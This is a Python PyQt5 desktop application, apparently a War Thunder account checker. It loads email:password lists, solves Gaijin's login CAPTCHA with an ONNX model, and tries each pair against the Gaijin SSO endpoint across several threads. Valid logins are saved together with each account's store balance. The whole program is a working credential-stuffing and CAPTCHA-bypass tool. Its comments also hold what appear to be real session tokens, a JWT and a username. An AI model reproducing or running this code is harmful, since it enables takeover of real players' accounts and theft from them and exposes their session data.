import sys, string
import re
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QTabWidget, QTextEdit, QLabel,
    QLineEdit, QComboBox, QPushButton, QFileDialog, QFormLayout, QSpinBox, QDoubleSpinBox
)
from PyQt5.QtGui import QIcon

import PyQt5_stylesheets
from loguru import logger

import numpy as np
import onnxruntime as onr

from io import BytesIO
from PIL import Image

import json, threading, os, time
from datetime import datetime
import requests, random



class SoftwareSettings:
    def __init__(self) -> None:
        self.threads = 1
    
    def save_data(self) -> None:
        data = {
            "threads":self.threads,
        }
        with open('settings.json', 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
        logger.info(f"Saved settings into file!")
    
    def try_load_settings(self) -> None:
        try:
            with open('settings.json', 'r', encoding='utf-8') as f:
                settings_json = json.loads(f.read())
            self.threads = settings_json['threads']

            main_window.settings_tab.thread_count_field.setValue(self.threads)

        except FileNotFoundError:
            logger.info(f"Settings file not found! Creating it...")
            self.save_data()
        except KeyError:
            logger.info(f"Settings file is strange! Reset to Defaults...")
            self.save_data()
        except json.JSONDecodeError:
            logger.info(f"Settings file corrupted! Reset to Defaults...")
            self.save_data()

class SoftwareRunData:
    def __init__(self) -> None:
        self.selected_check_file = None
        self.thread_pool = []
        self.active_checking = False
        self.valid_count = 0
        self.invalid_count = 0
        self.total_checked = 0
        self.valid_strs = ""
        self.is_running = True
        threading.Thread(target=self.loop_check_end).start()
    def add_valid(self, valid_string):
        self.total_checked += 1
        self.valid_count += 1
        self.valid_strs += f"{valid_string}\n"
        main_window.main_tab.update_stats(valid=self.valid_count, invalid=self.invalid_count)
    def add_invalid(self):
        self.invalid_count += 1
        self.total_checked += 1
        main_window.main_tab.update_stats(valid=self.valid_count, invalid=self.invalid_count)
    
    def clear_stats(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.total_checked = 0
        self.valid_strs = ""
        main_window.main_tab.update_stats(valid=self.valid_count, invalid=self.invalid_count)
        logger.info(f"Cleared current run data")
    
    def save_result_valid(self):
        main_window.main_tab.clear_rundata_button.setEnabled(True)
        if self.valid_strs != "":
            logger.info(f"Saving result...")
            savedir = "./result"
            if not os.path.isdir(savedir):
                logger.info(f"Dir \"{savedir}\" not found =( Creating it...")
                os.mkdir(savedir)
            now = datetime.now()
            formatted_datetime = now.strftime('%Y-%m-%d-%H-%M')
            path_to_txt = os.path.join(savedir, f"{formatted_datetime}.txt")
            with open(path_to_txt, 'w', encoding='utf-8') as f:
                f.write(self.valid_strs)
            full_path = os.path.abspath(path_to_txt)
            logger.info(f"Saved result at {full_path}")
        else:
            logger.info(f"Nothing to save =(")
    
    def loop_check_end(self):
        while self.is_running:
            if self.thread_pool == [] and not self.active_checking:
                time.sleep(1)
            elif self.thread_pool == [] and self.active_checking:
                self.save_result_valid()
                self.active_checking = False
            else:
                for thr in self.thread_pool:
                    if not thr.is_alive():
                        if len(self.thread_pool) == 1:
                            self.save_result_valid()
                            self.thread_pool.remove(thr)
                        else:
                            self.thread_pool.remove(thr)
                time.sleep(1)





class _i18n:
    def __init__(self) -> None:
        self.select_file = "Select File"
        self.start = "Start"
        self.clear_rundata = "Clear logs and software data"
        self.stop = "Stop"
        self.software_settings = "Software Settings"
        self.valid = "Valid: "
        self.invalid = "Invalid: "
        self.threads = "Threads:"
        self.switch_theme = "Switch Theme"
        self.info = "я че ипу че тут писать"
        self.credits = "Developer - Hentinels\nDesigner - Hentinels\nThanks for AI to Hentinels\n\nDont ask me why credits has only one preson."
        self.window_title = '𝙎𝙄𝙂𝙈𝘼 𝙒𝘼𝙍𝙏𝙃𝙐𝙉𝘿𝙀𝙍'
        self.main_tab = "Main"
        self.settings_tab = "Settings"
        self.info_tab = "Info"
        self.credits_tab = "Credits"

class MainTab(QWidget):
    def __init__(self) -> None:
        super().__init__()
        self.initUI()
        logger.remove()
        logger.add(self.append_log, format="{time:YYYY-MM-DD HH:mm:ss} | {level} | {message}")

    def initUI(self) -> None:
        layout = QVBoxLayout()
        self.logs_text_edit = QTextEdit()
        self.logs_text_edit.setReadOnly(True)
        self.stats_label_valid = QLabel(f"{i18n.valid}0")
        self.stats_label_invalid = QLabel(f"{i18n.invalid}0")
        self.select_file_button = QPushButton(i18n.select_file)
        self.select_file_button.clicked.connect(self.select_check_file)
        self.check_button = QPushButton(i18n.start)
        self.check_button.clicked.connect(self.start)
        self.stop_button = QPushButton(i18n.stop)
        self.stop_button.clicked.connect(self.stop)
        self.clear_rundata_button = QPushButton(i18n.clear_rundata)
        self.clear_rundata_button.clicked.connect(self.clear_rundata)
        layout.addWidget(self.logs_text_edit)
        layout.addWidget(self.stats_label_valid)
        layout.addWidget(self.stats_label_invalid)
        layout.addWidget(self.select_file_button)
        layout.addWidget(self.check_button)
        layout.addWidget(self.stop_button)
        layout.addWidget(self.clear_rundata_button)
        self.setLayout(layout)

    def select_check_file(self) -> None:
        run_data.selected_check_file, _ = QFileDialog.getOpenFileName(self, i18n.select_file)
        if run_data.selected_check_file:
            logger.info(f"Selected file: {run_data.selected_check_file}")

    def start(self) -> None:
        if run_data.selected_check_file:
            self.clear_rundata_button.setEnabled(False)
            with open(run_data.selected_check_file, 'r', encoding='utf-8') as file:
                divided_stroki = utils.divide_list(file.read().split('\n'), settings_data.threads)
                run_data.active_checking = True
                for divided_list in divided_stroki:
                    thread_checker = threading.Thread(target=check_thread, args=(divided_list,))
                    run_data.thread_pool.append(thread_checker)
                    thread_checker.start()
                
                    
        else:
            logger.info(f"No selected file to check =( pls select it")

    def stop(self) -> None:
        if run_data.active_checking:
            run_data.active_checking = False
            logger.info(f"Stopped")
        else:
            logger.info(f"Nothing to stop =)")

    def update_stats(self, valid, invalid) -> None:
        self.stats_label_valid.setText(f"{i18n.valid}{valid}")
        self.stats_label_invalid.setText(f"{i18n.invalid}{invalid}")

    def clear_rundata(self) -> None:
        self.clear_logs()
        run_data.clear_stats()
    
    def append_log(self, text) -> None:
        self.logs_text_edit.append(text.strip())

    def clear_logs(self) -> None:
        self.logs_text_edit.clear()

class SettingsTab(QWidget):
    def __init__(self) -> None:
        super().__init__()
        self.initUI()

    def initUI(self) -> None:
        layout = QVBoxLayout()
        self.form_layout = QFormLayout()
        self.software_settings_label = QLabel(i18n.software_settings)
        self.software_settings_label.setStyleSheet("font-weight: bold;")
        self.form_layout.addRow(self.software_settings_label)
        
        self.thread_count_field = QSpinBox()
        self.thread_count_field.setMinimum(1)
        self.thread_count_field.setMaximum(10)
        self.thread_count_field.valueChanged.connect(self.on_thread_count_changed)

        self.form_layout.addRow(i18n.threads, self.thread_count_field)

        self.theme_button = QPushButton(i18n.switch_theme)
        self.theme_button.clicked.connect(self.switch_theme)
        self.form_layout.addRow(self.theme_button)

        layout.addLayout(self.form_layout)
        self.setLayout(layout)

        self.current_theme = 'dark'
        self.apply_theme(self.current_theme)
    
    def switch_theme(self) -> None:
        if self.current_theme == 'light':
            self.current_theme = 'dark'
        else:
            self.current_theme = 'light'
        self.apply_theme(self.current_theme)

    def on_thread_count_changed(self, thread_count) -> None:
        settings_data.threads = thread_count
        logger.info(f"Selected thread count is: {thread_count}")
        settings_data.save_data()

    def apply_theme(self, theme) -> None:
        if theme == 'light':
            app.setStyleSheet(PyQt5_stylesheets.load_stylesheet_pyqt5(style="style_Classic"))
            logger.info(f"Changed theme to light")
        else:
            app.setStyleSheet(PyQt5_stylesheets.load_stylesheet_pyqt5(style="style_Dark"))
            logger.info(f"Changed theme to dark")

class InfoTab(QWidget):
    def __init__(self) -> None:
        super().__init__()
        self.initUI()

    def initUI(self) -> None:
        layout = QVBoxLayout()
        self.form_layout = QFormLayout()
        info_label = QLabel(i18n.info)
        self.form_layout.addRow(info_label)
        layout.addLayout(self.form_layout)
        self.setLayout(layout)

class CreditsTab(QWidget):
    def __init__(self) -> None:
        super().__init__()
        self.initUI()

    def initUI(self) -> None:
        layout = QVBoxLayout()
        self.form_layout = QFormLayout()
        credits_label = QLabel(i18n.credits)
        self.form_layout.addRow(credits_label)
        layout.addLayout(self.form_layout)
        self.setLayout(layout)

class MainWindow(QMainWindow):
    def __init__(self) -> None:
        super().__init__()
        self.initUI()

    def initUI(self) -> None:
        self.setWindowTitle(i18n.window_title)
        self.setGeometry(100, 100, 800, 600)
        self.setWindowIcon(QIcon('data/sigma.ico'))

        self.main_tab = MainTab()
        self.settings_tab = SettingsTab()
        self.info_tab = InfoTab()
        self.credits_tab = CreditsTab()

        tabs = QTabWidget()
        tabs.addTab(self.main_tab, i18n.main_tab)
        tabs.addTab(self.settings_tab, i18n.settings_tab)
        tabs.addTab(self.info_tab, i18n.info_tab)
        tabs.addTab(self.credits_tab, i18n.credits_tab)

        self.setCentralWidget(tabs)
    
    def closeEvent(self, event):
        run_data.is_running = False
        super().closeEvent(event)

class Utils:

    def __init__(self) -> None:
        self.onr_instance = onr.InferenceSession("modelwt.onnx")
        self.characters_wt = ['2', '3', '4', '5', '6',
                 '7', '9', 'a', 'b', 'c',
                 'd', 'e', 'f', 'g', 'h',
                 'j', 'k', 'm', 'n', 'p',
                 'q', 'r', 's', 't', 'u',
                 'v', 'w', 'x', 'y', 'z']
        self.img_width = 150
        self.img_height = 60
    
    def solve_captcha(self, image_bytes) -> list:

        buffered = BytesIO()
        buffered.write(image_bytes)
        img = Image.open(buffered)
        img = img.resize((self.img_width, self.img_height))
        img = np.array(img.convert('L'))
        img = img.astype(np.float32) / 255.
        img = np.expand_dims(img, axis=0)
        img = img.transpose([2,1,0])
        img = np.expand_dims(img, axis=0)
        result_tensor =self.onr_instance.run(None, {'image': img})[0]
        prediction = self.get_captcha_solvation_result(result_tensor, self.characters_wt, 6)
        del buffered, img, result_tensor
        return prediction

    def get_captcha_solvation_result(self, pred, characters, max_length) -> list:

        accuracy = 1
        last = None
        ans = []

        for item in pred[0]:
            char_ind = item.argmax()

            if char_ind != last and char_ind != 0 and char_ind != len(characters) + 1:
                ans.append(characters[char_ind - 1])
                accuracy *= item[char_ind]

            last = char_ind

        answ = "".join(ans)[:max_length]

        return [answ, accuracy]

    def divide_list(self, lst, x): 
        k, m = divmod(len(lst), x) 
        return [lst[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(x)]

    def is_valid_email(self, email):
        pattern = r"[^@]+@[^@]+\.[^@]+"
        return re.match(pattern, email) is not None

    def generate_random_string(self, length):
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters) for _ in range(length))
        return random_string


def check_thread(strings):
    for string in strings:
        if not run_data.active_checking:
            break
        splt_str = string.split(':')
        if len(string) > 4 and len(splt_str) == 2 and utils.is_valid_email(splt_str[0]):
            check_valid(splt_str[0],splt_str[1])
        elif not utils.is_valid_email(splt_str[0]):
            logger.info(f'Skipping (no email): {string}')
        else:
            logger.info(f'Skipping: {string}')
def check_valid(login, password):
    session = requests.Session()
    while True:
        captcha_image = session.get(f'https://embed.gaijin.net/captcha').content
        solvation = utils.solve_captcha(captcha_image)

        check_captcha_valid = session.get(f"https://embed.gaijin.net/ru/ajax/validatecaptcha/?code={solvation[0]}")
        if check_captcha_valid.json()['status'] == "ok":
            data = {
                'login': login,
                'password': password,
                'action': '',
                'referer': '',
                'captcha': solvation[0],
                'fingerprint': utils.generate_random_string(len('fa187bf0cc39a5fa2f90580e24409999')),
                'app_id': '',
            }
            response = session.post('https://embed.gaijin.net/ru/sso/login/procedure/' , data=data)
            if "identity_id" not in response.cookies.get_dict().keys():
                run_data.add_invalid()
                logger.info(f'Invalid: {login}')
                return False
            else:
                response = session.get('https://store.gaijin.net/')
                balance = response.text.split('[{"label":"')[1].split('"')[0]
                run_data.add_valid(f'{login}:{password} - {balance}')
                logger.info(f'Valid: {login}')
                return True #{'identity_sid': 'l53rq3psnoiunn5eqg6roqkm71', 'identity_id': '111856766', 'identity_token': 'ljddfj2wsb44p3bea6k46k786kd9wndhqhfxfpgcsznp1j4xrz3xkwr5gp548yhx', 'slc': '%7B%22ts%22%3A1707885541%2C%22f%22%3A%22830188f4d39fbb0a6ffd924fde4e4717%22%2C%22l%22%3A%5B111856766%5D%2C%22s%22%3A%227cc94abe71998e5d0438499573ff4d3e%22%7D'}

def s_check_valid(login, password):
    session = requests.Session()
    while True:
        if not run_data.active_checking:
            break
        headers = {
            'authority': 'embed.gaijin.net',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://embed.gaijin.net',
            'referer': 'https://embed.gaijin.net/ru',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        }
        data = {
                'login': login,
                'password': password,
                'action': '',
                'referer': '',
                'fingerprint': utils.generate_random_string(len('fa187bf0cc39a5fa2f90580e24409999')),
                'app_id': '',
        }
        response = session.post(
            'https://embed.gaijin.net/ru/sso/login/procedure/',
            data=data,
            headers=headers
        )
        with open('base.html', 'w') as f:
            f.write(response.text)
        if "uname" in response.text:
            try:
                response = session.get('https://store.gaijin.net/')
                balance = response.text.split('[{"label":"')[1].split('"')[0]
                run_data.add_valid(f'{login}:{password} - {balance}')
                logger.info(f'Valid: {login}')
                return True
            except:
                pass
        else:
            run_data.add_invalid()
            logger.info(f'Invalid: {login}')
            return False
        
#<script>(window.opener||window.parent).postMessage({"gjSSO":true,"gsea":true,"action":"login","source":"login","jwt":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjM4MTQ3NiIsInR5cCI6IkpXVCJ9.eyJhdXRoIjoibG9naW4iLCJjbnRyeSI6IlJVIiwiZXhwIjoxNzEwNDc0OTk4LCJmYWMiOiIxM2Y1NTdlYjZkNGYwNWEzZGIyZDkzYzFlMzkzYmY2YjQ0ODllMGNlYThiY2U4NmE5MWIzOTZiODcyMjc1ZmVlIiwiaWF0IjoxNzA3ODgyOTk4LCJpc3MiOiIxIiwia2lkIjoiMzgxNDc2IiwibG5nIjoicnUiLCJsb2MiOiIxNDM5OGNlYjdmMzU1NjFiZTRiOWU2NzhkYTU3ZjUwMWMwNjAzZjc2ZTZiMDk2OWQ1ZDMzZjg2OGZhNmUxMGE0IiwibmljayI6IkVnb3JfMjAwNF9SZXVub3YiLCJzbHQiOiJaTUFXcVJ4RiIsInRncyI6ImRpZmZjdXJyLGxhbmdfYnkscGFydG5lcl95Y3BjLHd0X3ljcGNfYnlfMTQzNzUzOTlfMTIyMDY0MTc1MF80MjIyMTcwMTY3IiwidWlkIjoiODI5MzI2NDgifQ.jMdg6o5RFNkt6N4sfks3eqMec6T-xQjFrYIDvOg-gCKqhnBLTXPVOJZaiT_CDoZO1nuASX3CZHlexqle2uEByzg0QG_l3oWUGBjW39bvVo2EsSI9GnR9qRmhzIZ2lEWTwwZElYcwGXISYcbMGFvyGKSneFCqRb7LL4fA4Wntzqo-z-afjyyLiJ50iaIGtlwite5HLJ-H5uR5GDWtlj9kf0C2qJjUAlv9bgduSjcw85GlbN0XWqsSunjy0na7AQlh0t8DMRFIfgO7iW-snwySsbZlKG7_3BRjd1FyDfaawZ3Z7oF3dX3WEWR0QBRZyGRFzPd5XdEkqUaTG_TaBDgdHQ","status":"ok","secondary":false,"uid":"82932648","uname":"Egor_2004_Reunov"},'*');window.close();</script>

def app_exec():
    app.exec_()
    run_data.is_running = False

if __name__ == '__main__':
    app = QApplication(sys.argv)

    run_data = SoftwareRunData()
    settings_data = SoftwareSettings()
    utils = Utils()
    i18n = _i18n()

    main_window = MainWindow()
    main_window.show()
    app.setStyleSheet(PyQt5_stylesheets.load_stylesheet_pyqt5(style="style_Dark"))
    settings_data.try_load_settings()
    main_window.main_tab.clear_logs()
    sys.exit(app_exec())#run_data.is_running = False
